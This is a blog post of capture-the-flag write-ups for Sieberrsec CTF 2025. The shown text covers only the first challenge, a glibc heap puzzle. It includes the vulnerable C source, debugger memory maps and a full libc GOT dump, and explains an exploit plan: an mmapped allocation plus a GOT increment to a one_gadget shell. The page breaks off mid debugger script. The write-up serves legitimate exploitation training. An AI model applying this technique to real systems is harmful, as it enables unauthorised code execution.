<!doctypehtml>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sieberrsec CTF 2025</title>

  <meta name="viewport"content="width=device-width,initial-scale=1">
  <meta http-equiv="X-UA-Compatible"content="ie=edge">

  <link rel="shortcut icon"href="../assets/favicon.ico"type="image/x-icon">
  <link rel="preload"href="../styles/article.css"as="style">
  <link rel="stylesheet"href="../styles/article.css">
</head>
<body>
  <header id="top-container"role="navigation">
    <nav>
  <a class="logo-link"href="/">
    <h1>Nikola's blog</h1>
    <span>ctf and stuff</span>
  </a>
  <small>
    <a id="about"class="info-link"href="/about.html">About</a> /
    <a id="articles"class="info-link"href="/articles.html">Articles</a>
  </small>
</nav>

  </header>
  <main id="main-container">
    <article id="article-container">
      <h1 id="article-title">
        Sieberrsec CTF 2025
      </h1>
      
        <h2 id="article-subtitle">
          Writeups for qualifiers and finals of Sieberrsec CTF 2025
        </h2>
      
      <time id="article-date">
        2025.07.22
      </time>
      <section id="article-content-container">
        <details><summary>Table of Contents</summary>
<p><div class="table-of-contents"><ul><li><a href="#a-%2B-b-%2B-c-%3D-shell">a + b + c = shell</a><ul><li><a href="#challenge-protections">Challenge Protections</a><li><a href="#what-can-we-attack%3F">What can we attack?</a><li><a href="#exploit-formulation-process">Exploit Formulation Process</a><li><a href="#full-solve-script">Full solve script</a></ul><li><a href="#authenticator">Authenticator</a><ul><li><a href="#challenge-protections-1">Challenge Protections</a><li><a href="#information-leak">Information Leak</a><li><a href="#full-solve-script-1">Full solve script</a></ul><li><a href="#securelogin-3000">SecureLogin 3000</a><ul><li><a href="#challenge-protections-2">Challenge Protections</a><li><a href="#vulnerability">Vulnerability</a><li><a href="#exploit">Exploit</a><li><a href="#write-what-to-where%3F">Write What to Where?</a><li><a href="#full-solve-script-2">Full solve script</a></ul><li><a href="#bearings-check">Bearings Check</a><ul><li><a href="#challenge-protections-3">Challenge Protections</a><li><a href="#info-leak">Info Leak</a><li><a href="#ret2system%40plt">ret2system@plt</a><li><a href="#full-solve-script-3">Full solve script</a></ul><li><a href="#leaky-heap">Leaky Heap</a><ul><li><a href="#challenge-protections-4">Challenge Protections</a><li><a href="#vulnerability-1">Vulnerability</a><li><a href="#exploitation">Exploitation</a><li><a href="#full-solve-script-4">Full solve script</a></ul><li><a href="#sieberrop">Sieberrop</a><ul><li><a href="#challenge-protections-5">Challenge Protections</a><li><a href="#what-is-srop%3F">What is SROP?</a><li><a href="#exploit-1">Exploit</a><li><a href="#full-solve-script-5">Full solve script</a></ul><li><a href="#writer">Writer</a><ul><li><a href="#challenge-protections-6">Challenge Protections</a><li><a href="#vulnerability-2">Vulnerability</a><li><a href="#write-what-where%3F">Write What Where?</a><li><a href="#info-leak-1">Info Leak</a><li><a href="#code-execution">Code Execution</a></ul><li><a href="#photoshop">Photoshop</a><ul><li><a href="#challenge-protections-7">Challenge Protections</a><li><a href="#binary-analysis">Binary Analysis</a><li><a href="#exploit-formulation">Exploit Formulation</a><li><a href="#full-exploit">Full exploit</a></ul></ul></div><p></p>
</details>
<p>This previous weekend, I had the privilege of attending both the qualifiers and finals of Sieberrsec CTF 2025, a CTF competition held by the Hwa Chong Institution (HCI) of Singapore. My team r3dw473rm3l0n5 and I managed to achieve second place in the qualifiers and fourth place in the finals.</p>
<h2 id="a-%2B-b-%2B-c-%3D-shell"tabindex="-1">a + b + c = shell</h2>
<blockquote>
<p>solve for shell :*</p>
<p><strong>author</strong>: whywhy</p>
<p><strong>solves</strong>: 2</p>
</blockquote>
<h3 id="challenge-protections"tabindex="-1">Challenge Protections</h3>
<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No

[*] '/home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
</code></pre>
<p>This challenge is quite simple in design, that it exposes an interface to choose the size you wish to malloc, the offset you want to write from, and the content you want to write:</p>
<pre class="hljs"><code><span class="hljs-comment">// gcc -o chal chal.c -fstack-protector-all -Wl,-z,relro,-z,now -pie -fpie</span>

<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);
    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);
    <span class="hljs-type">long</span> <span class="hljs-type">long</span> sz;
    <span class="hljs-type">long</span> <span class="hljs-type">long</span> off;
    <span class="hljs-type">long</span> <span class="hljs-type">long</span> dat;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc size? \n&gt; &quot;</span>);
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>, &amp;sz);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;offset? \n&gt; &quot;</span>);
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>, &amp;off);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;increment? \n&gt; &quot;</span>);
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>, &amp;dat);
    <span class="hljs-type">long</span> <span class="hljs-type">long</span>* buf = <span class="hljs-built_in">malloc</span>(sz);
    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">char</span>*)buf+off) += dat;
    <span class="hljs-built_in">puts</span>(<span class="hljs-literal">NULL</span>);
}
</code></pre>
<p>At first glance, the challenge seems nontrivial because normal heap allocations live in a separate memory region from any key attack surfaces in memory such as binary memory or libc.</p>
<pre class="hljs"><code>Start              End                Size               Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000001000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x0000555555555000 0x0000555555556000 0x0000000000001000 0x0000000000001000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched  &lt;-  $rip
0x0000555555556000 0x0000555555557000 0x0000000000001000 0x0000000000002000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x0000555555557000 0x0000555555558000 0x0000000000001000 0x0000000000002000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched  &lt;-  $r14
0x0000555555558000 0x000055555555b000 0x0000000000003000 0x0000000000003000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x000055555555b000 0x000055555557c000 0x0000000000021000 0x0000000000000000 rw- [heap] &lt;- not contiguous with either binary or libc
0x00007ffff7dde000 0x00007ffff7de1000 0x0000000000003000 0x0000000000000000 rw- &lt;tls-th1&gt;
0x00007ffff7de1000 0x00007ffff7e07000 0x0000000000026000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7e07000 0x00007ffff7f5c000 0x0000000000155000 0x0000000000026000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7f5c000 0x00007ffff7faf000 0x0000000000053000 0x000000000017b000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6  &lt;-  $r10
0x00007ffff7faf000 0x00007ffff7fb3000 0x0000000000004000 0x00000000001ce000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7fb3000 0x00007ffff7fb5000 0x0000000000002000 0x00000000001d2000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6  &lt;-  $r8
...
</code></pre>
<p>However, it is worth noting that if a large enough size is requested from malloc, _int_malloc will mmap a separate chunk to fulfil the request, which is a constant offset from libc. This is because malloc first checks these locations for free chunks large enough to satisfy our request:</p>
<ol>
<li>tcache</li>
<li>fastbins</li>
<li>smallbins, unsorted bins, largebins</li>
<li>finally, malloc decides whether to create a new chunk from the wilderness or mmap</li>
</ol>
<p>If we request an arbitrarily large size from malloc, we will be able to coerce libc into mmaping a memory region to service our request.</p>
<p>Entering 1000000000 as a malloc size, we can now check our memory mappings:</p>
<pre class="hljs"><code>Start              End                Size               Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000001000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x0000555555555000 0x0000555555556000 0x0000000000001000 0x0000000000001000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched  &lt;-  $rip
0x0000555555556000 0x0000555555557000 0x0000000000001000 0x0000000000002000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x0000555555557000 0x0000555555558000 0x0000000000001000 0x0000000000002000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched  &lt;-  $r14
0x0000555555558000 0x000055555555b000 0x0000000000003000 0x0000000000003000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/chal_patched
0x000055555555b000 0x000055555557c000 0x0000000000021000 0x0000000000000000 rw- [heap]
0x00007fffbc431000 0x00007ffff7de1000 0x000000003b9b0000 0x0000000000000000 rw- &lt;tls-th1&gt;  &lt;-  $rax
0x00007ffff7de1000 0x00007ffff7e07000 0x0000000000026000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7e07000 0x00007ffff7f5c000 0x0000000000155000 0x0000000000026000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7f5c000 0x00007ffff7faf000 0x0000000000053000 0x000000000017b000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7faf000 0x00007ffff7fb3000 0x0000000000004000 0x00000000001ce000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7fb3000 0x00007ffff7fb5000 0x0000000000002000 0x00000000001d2000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6
0x00007ffff7fb5000 0x00007ffff7fc4000 0x000000000000f000 0x0000000000000000 rw-
0x00007ffff7fc4000 0x00007ffff7fc6000 0x0000000000002000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc6000 0x00007ffff7fc8000 0x0000000000002000 0x0000000000000000 r-- [vvar_vclock]
0x00007ffff7fc8000 0x00007ffff7fca000 0x0000000000002000 0x0000000000000000 r-x [vdso]
0x00007ffff7fca000 0x00007ffff7fcb000 0x0000000000001000 0x0000000000000000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2
0x00007ffff7fcb000 0x00007ffff7ff1000 0x0000000000026000 0x0000000000001000 r-x /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2
0x00007ffff7ff1000 0x00007ffff7ffb000 0x000000000000a000 0x0000000000027000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000002000 0x0000000000031000 r-- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000002000 0x0000000000033000 rw- /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/ld-linux-x86-64.so.2  &lt;-  $r15
0x00007ffffffdd000 0x00007ffffffff000 0x0000000000022000 0x0000000000000000 rw- [stack]  &lt;-  $rbx, $rsp, $rbp, $r13
0xffffffffff600000 0xffffffffff601000 0x0000000000001000 0x0000000000000000 --x [vsyscall]
gef&gt; x/40gx 0x00007fffbc431000
0x7fffbc431000:	0x0000000000000000	0x000000003b9ad002 &lt;-- our mmapped allocation!
0x7fffbc431010:	0x0000000000000000	0x00000000000a0000
0x7fffbc431020:	0x0000000000000000	0x0000000000000000
0x7fffbc431030:	0x0000000000000000	0x0000000000000000
0x7fffbc431040:	0x0000000000000000	0x0000000000000000
0x7fffbc431050:	0x0000000000000000	0x0000000000000000
0x7fffbc431060:	0x0000000000000000	0x0000000000000000
0x7fffbc431070:	0x0000000000000000	0x0000000000000000
0x7fffbc431080:	0x0000000000000000	0x0000000000000000
0x7fffbc431090:	0x0000000000000000	0x0000000000000000
0x7fffbc4310a0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310b0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310c0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310d0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310e0:	0x0000000000000000	0x0000000000000000
0x7fffbc4310f0:	0x0000000000000000	0x0000000000000000
0x7fffbc431100:	0x0000000000000000	0x0000000000000000
0x7fffbc431110:	0x0000000000000000	0x0000000000000000
0x7fffbc431120:	0x0000000000000000	0x0000000000000000
0x7fffbc431130:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>Since our allocation is now a constant offset from libc, our attack surface has now increased to include any target within the libc memory region.</p>
<h3 id="what-can-we-attack%3F"tabindex="-1">What can we attack?</h3>
<p>Commonly, given an arbitrary write primitive, some common targets within LIBC would include the <code>__malloc_hook</code> and <code>__free_hook</code> regions. However, following <a href="https://man7.org/linux/man-pages/man3/malloc_hook.3.html">GLIBC version 2.32, <code>__malloc_hook</code> and <code>__free_hook</code> were deprecated. Following GLIBC 2.34 onwards, these variables were completely removed from LIBC altogether.</a> This cripples a very common and trivial attack surface.</p>
<p>However, there are still some viable attack targets within LIBC as detailed in nobodyisnobody’s <a href="https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md">Six Different Ways - Code Execution With a Write Primitive On Last Libc</a>:</p>
<ul>
<li>Libc GOT entries: viable under GLIBC 2.36 as Partial Relro is still enabled in libc binaries</li>
<li><a href="http://ld.so">ld.so</a> <code>link_map</code> structure: not very viable given we have only one write/add primitive</li>
<li>FSOP via <code>stdout</code>: not viable given we have only one <strong>QWORD</strong> write/add primitive</li>
<li><code>__printf_arginfo_table</code>: not viable given <code>printf</code> is not run with a format specifier after our write</li>
<li>TLS-Storage <code>dtor_list</code> overwrite: not viable given we have only one <strong>QWORD</strong> write/add primitive</li>
<li>mangled pointers in <code>initial</code> structure: not viable given we have only one <strong>QWORD</strong> write/add primitive</li>
<li>pivot from LIBC to stack via leaking <code>environ</code>: ONLY ONE WRITE</li>
</ul>
<p>With our <strong>very limited</strong> primitive, given we also do not have the luxury of an information leak, this leaves us with the only viable choice of attacking the libc GOT entries - particularly by incrementing specific entries by an offset to One Gadgets.</p>
<blockquote>
<p><a href="https://github.com/david942j/one_gadget">One Gadgets</a> are gadgets in libc that lead to code paths eventually executing <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> and similar derivatives without control of the $RDI, $RSI, and $RDX registers.</p>
</blockquote>
<h3 id="exploit-formulation-process"tabindex="-1">Exploit Formulation Process</h3>
<p>We must first find which GOT entry is executed during the course of the program after our write. Fortunately, this process is made easy with the <a href="https://github.com/bata24/gef">bata24 fork of gef</a>.</p>
<p>We can view the libc GOT with <code>got -f /fullpath/to/libc.so.6</code>:</p>
<pre class="hljs"><code>----------------- PLT / GOT - /home/nikolawinata/Documents/ctf/sieberr/quals/abcshell/libc.so.6 - Partial RELRO -----------------
Name                          | PLT            | GOT            | GOT value
----------------------------------------------------------- .rela.dyn -----------------------------------------------------------
*ABS*+0xb0a60                 | Not found      | 0x7ffff7fb2028 | 0x000000000000
svc_max_pollfd                | Not found      | 0x7ffff7fb2da8 | 0x7ffff7fc19e0 &lt;svc_max_pollfd&gt;
obstack_alloc_failed_handler  | Not found      | 0x7ffff7fb2db0 | 0x7ffff7fb44f8 &lt;obstack_alloc_failed_handler&gt;
__ctype_toupper               | Not found      | 0x7ffff7fb2dc0 | 0x7ffff7fb37f0 &lt;__ctype_toupper&gt;
loc1                          | Not found      | 0x7ffff7fb2dd0 | 0x7ffff7fbb5d0 &lt;loc1&gt;
_dl_argv                      | Not found      | 0x7ffff7fb2dd8 | 0x7ffff7ffca98 &lt;_dl_argv&gt;
__libc_single_threaded        | Not found      | 0x7ffff7fb2de8 | 0x7ffff7fbb5d8 &lt;__libc_single_threaded&gt;
free                          | 0x7ffff7e07360 | 0x7ffff7fb2df0 | 0x7ffff7e79ee0 &lt;free&gt;
re_syntax_options             | Not found      | 0x7ffff7fb2df8 | 0x7ffff7fbb220 &lt;re_syntax_options&gt;
rpc_createerr                 | Not found      | 0x7ffff7fb2e00 | 0x7ffff7fc1a00 &lt;rpc_createerr&gt;
stdout                        | Not found      | 0x7ffff7fb2e08 | 0x555555558010 &lt;stdout@GLIBC_2.2.5&gt;
__ctype32_toupper             | Not found      | 0x7ffff7fb2e10 | 0x7ffff7fb37e0 &lt;__ctype32_toupper&gt;
opterr                        | Not found      | 0x7ffff7fb2e18 | 0x7ffff7fb3408 &lt;opterr&gt;
getdate_err                   | Not found      | 0x7ffff7fb2e28 | 0x7ffff7fba780 &lt;getdate_err&gt;
__curbrk                      | Not found      | 0x7ffff7fb2e30 | 0x7ffff7fbb338 &lt;__curbrk&gt;
loc2                          | Not found      | 0x7ffff7fb2e38 | 0x7ffff7fbb5c8 &lt;loc2&gt;
program_invocation_name       | Not found      | 0x7ffff7fb2e40 | 0x7ffff7fb4518 &lt;program_invocation_name&gt;
__fpu_control                 | Not found      | 0x7ffff7fb2e48 | 0x7ffff7fb31c0 &lt;__fpu_control&gt;
__libc_enable_secure          | Not found      | 0x7ffff7fb2e50 | 0x7ffff7ffca60 &lt;__libc_enable_secure&gt;
_IO_2_1_stderr_               | Not found      | 0x7ffff7fb2e58 | 0x7ffff7fb4680 &lt;_IO_2_1_stderr_&gt;
__rcmd_errstr                 | Not found      | 0x7ffff7fb2e60 | 0x7ffff7fbbf78 &lt;__rcmd_errstr&gt;
__ctype_b                     | Not found      | 0x7ffff7fb2e68 | 0x7ffff7fb3808 &lt;__ctype_b&gt;
error_print_progname          | Not found      | 0x7ffff7fb2e70 | 0x7ffff7fbb5a8 &lt;error_print_progname&gt;
stderr                        | Not found      | 0x7ffff7fb2e78 | 0x7ffff7fb4840 &lt;stderr&gt;
obstack_exit_failure          | Not found      | 0x7ffff7fb2e80 | 0x7ffff7fb33c8 &lt;obstack_exit_failure&gt;
__libc_stack_end              | Not found      | 0x7ffff7fb2e88 | 0x7ffff7ffca58 &lt;__libc_stack_end&gt;
__key_encryptsession_pk_LOCAL | Not found      | 0x7ffff7fb2e90 | 0x7ffff7fc1b60 &lt;__key_encryptsession_pk_LOCAL&gt;
_rtld_global_ro               | Not found      | 0x7ffff7fb2e98 | 0x7ffff7ffcac0 &lt;_rtld_global_ro&gt;
argp_program_version          | Not found      | 0x7ffff7fb2ea0 | 0x7ffff7fbbb00 &lt;argp_program_version&gt;
svcauthdes_stats              | Not found      | 0x7ffff7fb2ea8 | 0x7ffff7fc1ac0 &lt;svcauthdes_stats&gt;
__check_rhosts_file           | Not found      | 0x7ffff7fb2eb0 | 0x7ffff7fb34c8 &lt;__check_rhosts_file&gt;
optind                        | Not found      | 0x7ffff7fb2eb8 | 0x7ffff7fb340c &lt;optind&gt;
_IO_2_1_stdin_                | Not found      | 0x7ffff7fb2ec0 | 0x7ffff7fb3a80 &lt;_IO_2_1_stdin_&gt;
program_invocation_short_name | Not found      | 0x7ffff7fb2ec8 | 0x7ffff7fb4510 &lt;program_invocation_short_name&gt;
__ctype32_tolower             | Not found      | 0x7ffff7fb2ed0 | 0x7ffff7fb37e8 &lt;__ctype32_tolower&gt;
error_message_count           | Not found      | 0x7ffff7fb2ed8 | 0x7ffff7fbb5a4 &lt;error_message_count&gt;
optopt                        | Not found      | 0x7ffff7fb2ee0 | 0x7ffff7fb3404 &lt;optopt&gt;
__ctype32_b                   | Not found      | 0x7ffff7fb2ee8 | 0x7ffff7fb3800 &lt;__ctype32_b&gt;
_nl_msg_cat_cntr              | Not found      | 0x7ffff7fb2ef0 | 0x7ffff7fb4d80 &lt;_nl_msg_cat_cntr&gt;
__daylight                    | Not found      | 0x7ffff7fb2ef8 | 0x7ffff7fba688 &lt;daylight&gt;
_nl_domain_bindings           | Not found      | 0x7ffff7fb2f00 | 0x7ffff7fb4cb8 &lt;_nl_domain_bindings&gt;
argp_program_bug_address      | Not found      | 0x7ffff7fb2f08 | 0x7ffff7fbbaf0 &lt;argp_program_bug_address&gt;
_IO_funlockfile               | Not found      | 0x7ffff7fb2f10 | 0x7ffff7e32fd0 &lt;funlockfile&gt;
svc_fdset                     | Not found      | 0x7ffff7fb2f18 | 0x7ffff7fc1a20 &lt;svc_fdset&gt;
__rseq_size                   | Not found      | 0x7ffff7fb2f20 | 0x7ffff7ffca10 &lt;__rseq_size&gt;
stdin                         | Not found      | 0x7ffff7fb2f30 | 0x555555558020 &lt;stdin@GLIBC_2.2.5&gt;
__timezone                    | Not found      | 0x7ffff7fb2f38 | 0x7ffff7fba680 &lt;timezone&gt;
__ctype_tolower               | Not found      | 0x7ffff7fb2f40 | 0x7ffff7fb37f8 &lt;__ctype_tolower&gt;
_IO_2_1_stdout_               | Not found      | 0x7ffff7fb2f50 | 0x7ffff7fb4760 &lt;_IO_2_1_stdout_&gt;
__tzname                      | Not found      | 0x7ffff7fb2f58 | 0x7ffff7fb4500 &lt;tzname&gt;
error_one_per_line            | Not found      | 0x7ffff7fb2f60 | 0x7ffff7fbb5a0 &lt;error_one_per_line&gt;
_res_hconf                    | Not found      | 0x7ffff7fb2f68 | 0x7ffff7fbc3e0 &lt;_res_hconf&gt;
__key_decryptsession_pk_LOCAL | Not found      | 0x7ffff7fb2f70 | 0x7ffff7fc1b58 &lt;__key_decryptsession_pk_LOCAL&gt;
_rtld_global                  | Not found      | 0x7ffff7fb2f78 | 0x7ffff7ffd020 &lt;_rtld_global&gt;
__progname                    | Not found      | 0x7ffff7fb2f80 | 0x7ffff7fb4510 &lt;program_invocation_short_name&gt;
h_errlist                     | Not found      | 0x7ffff7fb2f88 | 0x7ffff7fb2260 &lt;h_errlist&gt;
__environ                     | Not found      | 0x7ffff7fb2f90 | 0x7ffff7fbb320 &lt;environ&gt;
argp_err_exit_status          | Not found      | 0x7ffff7fb2f98 | 0x7ffff7fb34c4 &lt;argp_err_exit_status&gt;
svc_pollfd                    | Not found      | 0x7ffff7fb2fa0 | 0x7ffff7fc19e8 &lt;svc_pollfd&gt;
__progname_full               | Not found      | 0x7ffff7fb2fa8 | 0x7ffff7fb4518 &lt;program_invocation_name&gt;
argp_program_version_hook     | Not found      | 0x7ffff7fb2fb0 | 0x7ffff7fbbb08 &lt;argp_program_version_hook&gt;
optarg                        | Not found      | 0x7ffff7fb2fb8 | 0x7ffff7fbb280 &lt;optarg&gt;
malloc                        | 0x7ffff7e07368 | 0x7ffff7fb2fc8 | 0x7ffff7e79920 &lt;malloc&gt;
----------------------------------------------------------- .rela.plt -----------------------------------------------------------
*ABS*+0x9f540                 | 0x7ffff7e07350 | 0x7ffff7fb3000 | 0x7ffff7f39780
*ABS*+0x9c930                 | 0x7ffff7e07020 | 0x7ffff7fb3008 | 0x7ffff7f344c0
realloc                       | 0x7ffff7e07030 | 0x7ffff7fb3010 | 0x7ffff7e07036 &lt;.plt+0x36&gt;
*ABS*+0x9f240                 | 0x7ffff7e07040 | 0x7ffff7fb3018 | 0x7ffff7f37280
_dl_exception_create          | 0x7ffff7e07050 | 0x7ffff7fb3020 | 0x7ffff7e07056 &lt;.plt+0x56&gt;
*ABS*+0x9c690                 | 0x7ffff7e07060 | 0x7ffff7fb3028 | 0x7ffff7f33930
*ABS*+0xb1350                 | 0x7ffff7e07190 | 0x7ffff7fb3030 | 0x7ffff7e84610
calloc                        | 0x7ffff7e07080 | 0x7ffff7fb3038 | 0x7ffff7e07086 &lt;.plt+0x86&gt;
*ABS*+0x9f7c0                 | 0x7ffff7e07090 | 0x7ffff7fb3040 | 0x7ffff7f56000
*ABS*+0x9bcf0                 | 0x7ffff7e070a0 | 0x7ffff7fb3048 | 0x7ffff7f32f80
*ABS*+0x9c580                 | 0x7ffff7e070b0 | 0x7ffff7fb3050 | 0x7ffff7f33980
*ABS*+0xb1230                 | 0x7ffff7e07220 | 0x7ffff7fb3058 | 0x7ffff7f3b2a0
*ABS*+0x9c9f0                 | 0x7ffff7e070d0 | 0x7ffff7fb3060 | 0x7ffff7f34620
*ABS*+0xb12b0                 | 0x7ffff7e070e0 | 0x7ffff7fb3068 | 0x7ffff7f3b560
_dl_find_dso_for_object       | 0x7ffff7e070f0 | 0x7ffff7fb3070 | 0x7ffff7e070f6 &lt;.plt+0xf6&gt;
*ABS*+0x9f490                 | 0x7ffff7e07100 | 0x7ffff7fb3078 | 0x7ffff7f38e20
*ABS*+0x9f1b0                 | 0x7ffff7e07110 | 0x7ffff7fb3080 | 0x7ffff7f37100
*ABS*+0x9cb80                 | 0x7ffff7e07120 | 0x7ffff7fb3088 | 0x7ffff7f35370
*ABS*+0x9e8d0                 | 0x7ffff7e07130 | 0x7ffff7fb3090 | 0x7ffff7f36d70
*ABS*+0xb0c50                 | 0x7ffff7e07280 | 0x7ffff7fb3098 | 0x7ffff7f39d00
*ABS*+0x9d660                 | 0x7ffff7e07150 | 0x7ffff7fb30a0 | 0x7ffff7f36620
*ABS*+0x9c7a0                 | 0x7ffff7e07160 | 0x7ffff7fb30a8 | 0x7ffff7f34080
_dl_deallocate_tls            | 0x7ffff7e07170 | 0x7ffff7fb30b0 | 0x7ffff7e07176 &lt;.plt+0x176&gt;
__tls_get_addr                | 0x7ffff7e07180 | 0x7ffff7fb30b8 | 0x7ffff7e07186 &lt;.plt+0x186&gt;
*ABS*+0xb1350                 | 0x7ffff7e07070 | 0x7ffff7fb30c0 | 0x7ffff7e84610
*ABS*+0x9bd70                 | 0x7ffff7e071a0 | 0x7ffff7fb30c8 | 0x7ffff7f33220
*ABS*+0x9f2e0                 | 0x7ffff7e071b0 | 0x7ffff7fb30d0 | 0x7ffff7f37290
_dl_fatal_printf              | 0x7ffff7e071c0 | 0x7ffff7fb30d8 | 0x7ffff7e071c6 &lt;.plt+0x1c6&gt;
*ABS*+0x9d560                 | 0x7ffff7e071d0 | 0x7ffff7fb30e0 | 0x7ffff7f35d70
*ABS*+0xb0d70                 | 0x7ffff7e071e0 | 0x7ffff7fb30e8 | 0x7ffff7f50700
*ABS*+0x9e950                 | 0x7ffff7e071f0 | 0x7ffff7fb30f0 | 0x7ffff7f53370
*ABS*+0x9cae0                 | 0x7ffff7e07200 | 0x7ffff7fb30f8 | 0x7ffff7f35360
*ABS*+0x9f3f0                 | 0x7ffff7e07210 | 0x7ffff7fb3100 | 0x7ffff7f387d0
*ABS*+0xb1230                 | 0x7ffff7e070c0 | 0x7ffff7fb3108 | 0x7ffff7f3b2a0
*ABS*+0x9ca70                 | 0x7ffff7e07230 | 0x7ffff7fb3110 | 0x7ffff7f349d0
*ABS*+0xb0ce0                 | 0x7ffff7e07240 | 0x7ffff7fb3118 | 0x7ffff7f39f40
_dl_audit_symbind_alt         | 0x7ffff7e07250 | 0x7ffff7fb3120 | 0x7ffff7e07256 &lt;.plt+0x256&gt;
*ABS*+0x9f600                 | 0x7ffff7e07260 | 0x7ffff7fb3128 | 0x7ffff7f39a50
*ABS*+0x9d5e0                 | 0x7ffff7e07270 | 0x7ffff7fb3130 | 0x7ffff7f363e0
*ABS*+0xb0c50                 | 0x7ffff7e07140 | 0x7ffff7fb3138 | 0x7ffff7f39d00
*ABS*+0x9be60                 | 0x7ffff7e07290 | 0x7ffff7fb3140 | 0x7ffff7f33980
_dl_rtld_di_serinfo           | 0x7ffff7e072a0 | 0x7ffff7fb3148 | 0x7ffff7e072a6 &lt;.plt+0x2a6&gt;
_dl_allocate_tls              | 0x7ffff7e072b0 | 0x7ffff7fb3150 | 0x7ffff7e072b6 &lt;.plt+0x2b6&gt;
__tunable_get_val             | 0x7ffff7e072c0 | 0x7ffff7fb3158 | 0x7ffff7fde010 &lt;__tunable_get_val&gt;
*ABS*+0xb0e20                 | 0x7ffff7e072d0 | 0x7ffff7fb3160 | 0x7ffff7f3a460
*ABS*+0x9c830                 | 0x7ffff7e072e0 | 0x7ffff7fb3168 | 0x7ffff7f34380
*ABS*+0xb24e0                 | 0x7ffff7e072f0 | 0x7ffff7fb3170 | 0x7ffff7f3ac80
*ABS*+0x9d6f0                 | 0x7ffff7e07300 | 0x7ffff7fb3178 | 0x7ffff7f36810
_dl_allocate_tls_init         | 0x7ffff7e07310 | 0x7ffff7fb3180 | 0x7ffff7e07316 &lt;.plt+0x316&gt;
__nptl_change_stack_perm      | 0x7ffff7e07320 | 0x7ffff7fb3188 | 0x7ffff7e07326 &lt;.plt+0x326&gt;
*ABS*+0x9f5d0                 | 0x7ffff7e07330 | 0x7ffff7fb3190 | 0x7ffff7f55f10
_dl_audit_preinit             | 0x7ffff7e07340 | 0x7ffff7fb3198 | 0x7ffff7fe0a10 &lt;_dl_audit_preinit&gt;
*ABS*+0x9f540                 | 0x7ffff7e07010 | 0x7ffff7fb31a0 | 0x7ffff7f39780
</code></pre>
<p>“But there are so many entries…”, you may say, “how do we find which specific one is executed? Surely we must be meticulous about this, devote our fullest energies to this cau-”</p>
<hr>
<pre class="hljs"><code>set $addr = 0x7ffff7fb3000
while $addr &lt; 0x7ffff7fb31a8
